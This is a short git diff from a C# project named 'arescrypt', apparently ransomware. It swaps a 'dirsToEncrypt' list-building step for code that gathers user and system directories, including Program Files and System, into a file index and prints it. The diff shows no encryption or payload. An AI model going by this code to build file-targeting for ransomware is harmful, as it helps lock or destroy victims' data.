@@ -26,16 +26,10 @@ namespace arescrypt
             systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
             systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
             systemSpecificDirs.Add(Environment.GetFolderPath(Environment.SpecialFolder.System));
-
-            var dirsToEncrypt = new List<string> { }; // Initialize 'filesToEncrypt' to null
-            dirsToEncrypt.Concat(userSpecificDirs);
-            dirsToEncrypt.Concat(systemSpecificDirs);
-
-            string filesBeforeSplit = default(string);
-            foreach (string dir in userSpecificDirs) // dirsToEncrypt.Distinct().ToList())
-            {
-                FileHandler.DirSearch(dir); // returns List<string>
-            }
+            
+            string[] fullFileIndex = Misc.concatList(userSpecificDirs, systemSpecificDirs);
+            foreach (string file in fullFileIndex)
+                Console.WriteLine(file);
 
             Console.Write("\nPress any key to continue . . . ");
             Console.ReadKey(); // Hang the console
